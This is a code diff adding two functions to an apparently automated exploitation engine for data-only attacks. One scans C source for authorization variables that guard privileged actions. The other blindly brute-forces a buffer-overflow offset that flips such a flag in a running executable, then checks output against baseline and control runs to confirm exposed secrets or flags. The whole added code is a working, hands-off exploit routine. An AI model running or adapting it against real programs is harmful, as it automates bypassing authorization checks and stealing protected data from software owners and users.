@@ -84,3 +84,85 @@ def sweep_flag_flip(exe: str, *, marker: bytes, max_distance: int = 256, input_m
                               timeout=timeout):
             return plan
     return None
+
+
+# ---- source-side DOP target discovery -----------------------------------------------------------
+import re as _re
+
+#: a variable name that reads as a security DECISION (the thing a DOP write flips).
+_DECISION_VAR = _re.compile(r"(?:^|[^A-Za-z])(is_?auth\w*|authed|authenticated|is_?admin|admin|"
+                            r"is_?root|allow\w*|permit\w*|granted?|access|priv\w*|role|verified|"
+                            r"logged_?in|bypass|trusted)(?:[^A-Za-z]|$)", _re.I)
+#: a guarded privileged action inside the taken branch. Keywords are bounded by non-LETTERS (not \b)
+#: so they match inside identifiers like send_secret / grant_access / do_admin.
+_PRIV_ACTION = _re.compile(r"(?<![a-zA-Z])(system|exec|popen|setuid|setgid|seteuid|sprintf|strcpy|"
+                           r"send|recv|fopen|unlink|admin|root|grant|secret|flag|privile|shell|"
+                           r"passwd|token)(?![a-zA-Z])", _re.I)
+
+
+def find_dop_targets(src: str):
+    """Source-side DOP discovery: a SECURITY-DECISION variable whose value chooses between a guarded
+    (privileged) path and a denied one -- the thing a memory write flips in a data-only attack. We
+    flag `if (<decision-var>) { ...privileged... }` (and `if (!..) return;`-style gates) where the
+    variable name reads as an authorization decision and the guarded block contains a privileged
+    action. Returns [{var, line, hint}]. Pairs with a write primitive: the attack-path WRITE->AUTH
+    DOP edge is realised by overwriting one of these. Pure/static."""
+    out = []
+    lines = src.splitlines()
+    for i, ln in enumerate(lines):
+        m = _re.search(r"\bif\s*\(\s*(!?\s*[A-Za-z_][\w.\->]*)\s*\)", ln)
+        if not m:
+            continue
+        cond = m.group(1)
+        dv = _DECISION_VAR.search(cond)
+        if not dv:
+            continue
+        # look at the guarded block (this line's tail + the next few lines) for a privileged action.
+        window = " ".join(lines[i:i + 6])
+        if _PRIV_ACTION.search(window):
+            var = dv.group(1)
+            out.append({"var": var, "line": i + 1, "hint": ln.strip()[:90]})
+    # dedup by (var, line)
+    seen, uniq = set(), []
+    for d in out:
+        k = (d["var"], d["line"])
+        if k not in seen:
+            seen.add(k); uniq.append(d)
+    return uniq
+
+#: a printable token (>=4 chars) that could be a privileged-path signal.
+_TOKEN = _re.compile(rb"[\x20-\x7e]{4,}")
+
+
+def _tokens(out: bytes) -> set:
+    return set(_TOKEN.findall(out or b""))
+
+
+def discover_data_only(exe: str, *, benign: bytes = b"a\n", max_distance: int = 256,
+                       input_mode: str = "stdin", argv: Optional[list] = None,
+                       flip: bytes = b"\x01", timeout: float = 8.0):
+    """Fully hands-off DOP: DISCOVER both the privileged signal and the buffer->variable distance.
+    No marker is supplied. The privileged path is whatever stable, printable output the overflow
+    makes appear that a BENIGN run does not -- so we diff against the benign baseline rather than
+    knowing the secret in advance. Soundness is preserved: a candidate token must (1) appear under
+    the full overflow, (2) be absent from the benign baseline, (3) be absent from the negative
+    control (the same overflow one byte short of the variable -> not our write), and (4) reproduce
+    on a second overflow run (reject one-off corruption garbage). Returns (FlagFlipPlan, token) or
+    (None, None). Bounded by max_distance.
+
+    This turns the data-only chain hands-off: the earlier detonate_data_only needs the caller to
+    name the privileged marker; here the engine finds it, which is what lets DOP fire on a target
+    whose guarded output we do not know up front."""
+    base = _tokens(_run(exe, benign, input_mode=input_mode, argv=argv, timeout=timeout))
+    for d in range(1, max_distance + 1):
+        plan = plan_flag_flip(d, flip=flip)
+        pos = _tokens(_run(exe, plan.payload, input_mode=input_mode, argv=argv, timeout=timeout))
+        cand = pos - base
+        if not cand:
+            continue
+        neg = _tokens(_run(exe, plan.negative, input_mode=input_mode, argv=argv, timeout=timeout))
+        pos2 = _tokens(_run(exe, plan.payload, input_mode=input_mode, argv=argv, timeout=timeout))
+        for tok in sorted(cand - neg):
+            if tok in pos2:                              # stable across runs, caused by our write
+                return plan, tok
+    return None, None
